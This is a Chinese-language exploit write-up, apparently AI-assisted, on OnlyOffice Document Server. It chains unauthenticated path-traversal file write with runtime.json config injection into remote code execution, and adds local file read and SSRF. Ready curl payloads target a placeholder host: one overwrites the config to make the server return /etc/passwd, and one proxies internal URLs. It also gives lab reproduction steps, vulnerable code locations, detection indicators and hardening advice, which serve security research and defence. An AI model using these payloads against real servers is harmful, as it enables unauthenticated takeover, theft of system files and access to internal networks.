# OnlyOffice Document Server Unauthenticated RCE and LFI and SSRF

# 完全由glm5.3flash驱动 测试环境是windows，linux环境需要修改脚本

# 注意linux下和这个不一样，你需要个ds用户能写入并且execve的，这里可以使用log文件。

## TL;DR

漏洞 = **未授权路径穿越任意文件写** × **runtimeConfig 热加载配置注入** → RCE。
v9.x 生产默认配置（`runtimeConfig.filePath` 指向 `/var/www/onlyoffice/Data/runtime.json`）即可即时触发；
v9 以下版本无热加载层，同一写原语需覆写 `local.json`/站点脚本等等待重启/人工动作，被动触发。

## 影响面与前提

| 条件 | 说明 |
|---|---|
| 版本 | 5.0+；9.x 即时触发（本报告以 master（v9 dev）验证） |
| 鉴权 | 源码默认 `token.enable.request.inbox/browser = false`（`Common/config/default.json`），此时 `/downloadas`、`/converter`、`/docbuilder` 全部免鉴权。Docker 镜像默认开 JWT（`JWT_ENABLED=true`）+ 随机密钥 → 该类部署需先拿到/关闭 JWT；裸机 deb、自集成、老旧部署大量处于 JWT 关闭状态 |
| 配置 | v9 生产配置 `production-linux.json` 默认 `"runtimeConfig": {"filePath": "/var/www/onlyoffice/documentserver/../Data/runtime.json"}`（Windows 版默认 `./../runtime.json`），社区/企业版均生效 |

## 漏洞细节

### 1) 未授权任意文件写（路径穿越）

- `DocService/sources/canvasservice.js:409 saveParts()`：
  - `filename = 'Editor.' + cmd.getFormat()`，`cmd.format` 用户可控；
  - **savetype=3（COMPLETE_ALL）时跳过 `path.basename` 归一化**（`canvasservice.js:412-416`）；
  - 落盘 key：`cmd.getDocId() + cmd.getSaveKey() + '/' + filename`（`canvasservice.js:424`）。
  - `id`（docId）来自 cmd JSON，**未过 `DOC_ID_REGEX`**（`server.js:242 app.param` 只校验 URL 段）；攻击者自带 `savekey` 时跳过 `addRandomKeyTaskCmd` 随机化（`canvasservice.js:417`）。
- `Common/sources/storage/storage-fs.js:44 getFilePath()`：`path.join(folderPath, strPath)` —— **零穿越校验**，`..` 直接归一化逃逸存储根。
- `Common/sources/utils.js:1156 checkPathTraversal()` 仅被 `FileConverter` 的 `fileFrom` 两处调用；`downloadas` 链路完全未使用。
- 鉴权：`canvasservice.js:1550 downloadAs` 仅当 `token.enable.browser=true` 或 cmd 自带 token 时才校验 JWT —— 源码默认 false → **免鉴权**。
- 内容：请求 body 原样写盘（`cmd.setData(req.body)` → `putObject(..., buffer)`）→ 路径、文件名、内容三要素全可控。

POC 请求形态：
```
POST /downloadas/aaa?cmd={"c":"save","id":"PWNA","savekey":"SK","savetype":3,"format":"/../../../../pwn/pwn_rce.cmd"}
Content-Type: text/plain

<任意字节>
```

### 2) runtimeConfig 热加载 → 配置注入（v9 新增）

- `Common/sources/runtimeConfigManager.js`：v9 新增运行时配置层，`fs.watch` 监听 `runtimeConfig.filePath` 所在目录，文件变更 200ms 去抖后清缓存重读。
- `Common/sources/operationContext.js:112 initTenantCache()`：每个请求的配置 = `deepMerge(baseConfig, runtimeConfig, tenantConfig)` —— runtime.json 可覆盖**任意**配置键。
- 实测注入效果（无需重启）：
  - `services.CoAuthoring.token.enable.request.inbox` 翻转 → `/converter` 认证门禁实时开关（错误码 -8 ↔ 放行）；
  - `FileConverter.converter.docbuilderPath` 劫持 → 转换器 spawn 任意可执行路径（`resolveConverterPath` 对绝对路径原样放行，`converterPaths.js:60`）；
  - 其余可注入面：`FileConverter.converter.spawnOptions.env`（LD_PRELOAD）、`x2tPath`、ipfilter、static_content 等。

### 3) 触发执行

- 社区版（`license.packageType=0`，`Common/sources/runtime/profile.js`）恒为进程内 memory runtime：转换器跑在 DocService 进程内，注入后下一个任务即生效 → **即时触发**。
- `POST /docbuilder`（免鉴权时）→ `converterservice.js:460 builderRequest` → 任务 `builder` → `converter.js:1141 processPath = tenDocbuilderPath` → `spawnAsync` 执行被劫持路径。
- 实测标记文件由 payload 脚本生成：`PWNED-RCE-EXECUTED-AT-2026/10/03 13:33:45`。

## 复现步骤（本地实验室）

见 [poc_exploit.py](poc_exploit.py)。环境：
```
git clone --depth 1 https://github.com/ONLYOFFICE/server oo-server
(cd oo-server/{DocService,Common,FileConverter} && npm ci)
NODE_ENV=production NODE_CONFIG_DIR=.../Common/config \
NODE_CONFIG='{"queue":{"type":"memory"},"services":{"CoAuthoring":{"sql":{"type":"memory"}}},
  "storage":{"fs":{"folderPath":"<lab>/storage"}},
  "runtimeConfig":{"filePath":"<lab>/runtime.json"},
  "log":{"filePath":".../log4js/production.json"}}' \
node sources/server.js
```

实测时序（全部 200/成功）：
1. `/downloadas` 穿越 → `lab/pwn/pwned_write_test.txt`（逃出存储根）
2. `/downloadas` 覆写 `lab/runtime.json`（注入 JWT 开关 + docbuilderPath）
3. `/converter` 无 token：注入 inbox=true 后 `-8`；注入 inbox=false 后放行（配置接管可观测）
4. `/docbuilder` → `rce_marker.txt` 生成 = RCE

## v9 以下版本（被动触发）

无 runtimeConfig 热加载层。同一任意文件写可用于：
- 覆写 `/etc/onlyoffice/documentserver/local.json`（重启后加载 → 同样配置注入）；
- 覆写 `server/DocService/`（或 FileConverter）目录内 `require` 缓存外的 `.js`、`node_modules` 文件 → 等待进程重启；
- 覆写 web 静态资源（`web-apps`/`sdkjs`）→ 存储型 XSS → 打管理员/集成方（可窃取 JWT secret 或利用 Admin Panel）；
- 覆写 `AllFonts.js`、dictionary、`sdkjs` 配置等被编辑器加载的文件（打开文档时触发）。


**主机侧（文件完整性监控）：**
- `/var/www/onlyoffice/Data/runtime.json`（v9 默认热加载文件）的 mtime/内容变更 —— 高价值 IOC；
- `/etc/onlyoffice/documentserver/local.json`、`App_Data/cache/files` 下非预期命名文件；
- `Data/`、`fonts/` 等目录出现 `.cmd/.sh/.so/.py` 或非常规扩展名文件。

**进程侧：**
- `x2t`/`docbuilder` 子进程路径异常（非 `server/FileConverter/bin/`）；
- DocService/FileConverter 进程派生 shell（sh/cmd/powershell）。

**加固：**
1. `storage-fs getFilePath` 与 converter 侧 `downloadFileFromStorage`/`processUploadToStorageChunk` 全部路径先 `path.resolve` 后做根目录前缀校验；拒绝含 `..` 段的 storage key；
2. `/downloadas`、`/docbuilder` 对 `cmd.id` 强制 `DOC_ID_REGEX`；`savetype=3` 时同样对 `Editor.'+format` 做 basename 归一化；
3. runtimeConfig/tenantConfig 合并层禁止覆盖安全敏感键（`token.*`、`secret.*`、`ipfilter.*`、`x2tPath/docbuilderPath/spawnOptions`、`static_content`、`externalRequest.*`）；
4. 确保生产部署 JWT 默认开启（对齐 Docker 行为），`runtime.json` 权限收敛并纳入监控。

## 相关代码位置

| 位置 | 问题 |
|---|---|
| `DocService/sources/canvasservice.js:409-431` | saveParts：format/saveKey/docId 可控写 |
| `DocService/sources/canvasservice.js:1550-1584` | downloadAs JWT 门禁条件 |
| `Common/sources/storage/storage-fs.js:44` | getFilePath 无穿越校验 |
| `Common/sources/utils.js:1156` | checkPathTraversal 覆盖不足 |
| `Common/sources/runtimeConfigManager.js:96-122` | 运行时配置写入/热加载 |
| `Common/sources/operationContext.js:112` | 请求级配置合并（注入生效点） |
| `FileConverter/sources/converter.js:1118-1148` | x2t/docbuilder 路径经 getCfg 动态读取 |
| `FileConverter/sources/converterPaths.js:60` | 绝对路径原样放行 |
| `DocService/sources/converterservice.js:460` | /docbuilder 免鉴权任务入口 |


# LFI部分

```
[1] POST /downloadas  ──写原语──▶  覆写 /var/www/onlyoffice/Data/runtime.json
        {"wopi":{"enable":true,"dummy":{"enable":true,"sampleFilePath":"<目标>"}}}
        (runtime.json 是 node-config 覆盖层 → 只写这几个键，其余回退基础配置；200ms 热加载，无需重启)
[2] GET  /wopi/files/<docid>/contents  ──▶  回吐该文件
        源码 server.js:359 → apicache → checkWopiDummyEnable → wopiClient.dummyGetFile
        dummyGetFile: ctx.getCfg('wopi.dummy.sampleFilePath') + createReadStream()  ← 无任何路径 confinement
```

路由只挂了 `apicache` + `checkWopiDummyEnable`，没有 JWT、没有 checkClientIp → 纯未授权。默认 `wopi.enable` / `wopi.dummy.enable` 都是 `false`，所以必须先用写原语打开（三个键全是每请求 ctx.getCfg 读，改完即刻生效）。

## POC

```BASH
# A) 写 runtime.json（换成你要读的文件）
curl -sS -X POST 'http://TARGET/downloadas/x?cmd=%7B%22c%22%3A%20%22save%22%2C%20%22id%22%3A%20%22.%22%2C%20%22savekey%22%3A%20%22.%22%2C%20%22savetype%22%3A%203%2C%20%22format%22%3A%20%22/../../../../../../../../../../../../var/www/onlyoffice/Data/runtime.json%22%7D' -H 'Content-Type: text/plain' --data-binary '{"wopi":{"enable":true,"dummy":{"enable":true,"sampleFilePath":"/etc/passwd"}}}'

# B) 触发读取（docid 随便填，换新 docid 绕开 5 分钟 apicache）
curl -sS 'http://TARGET/wopi/files/rd1/contents'
```

# SSRF

- DocService/sources/canvasservice.js#downloadFile（路由 app.get('/downloadfile/:docid', canvasService.downloadFile) —— 既没有 checkClientIp 也没有 checkJwt）：

```js
const decoded = (await docsCoServer.getRequestParams(ctx, req)).params;   // inbox token 默认关 ⇒ 就是 ?url=
...
} else if (!tenTokenEnableBrowser) {          // browser token 默认 false ⇒ 命中这里
    if (decoded.url) { url = decoded.url; isInJwtToken = true; }  // ★ 硬编码 isInJwtToken=true
}
yield utils.downloadUrlPromise(ctx, url, ..., isInJwtToken /*第6参=opt_filterPrivate*/, ...);
res.set(response.headers); yield pipeline(stream, res);           // ★ 内容+响应头原样回吐
```

## POC

```
curl -sS 'http://127.0.0.1:8081/downloadfile/0?url=http://127.0.0.1:8000/index.html'
```
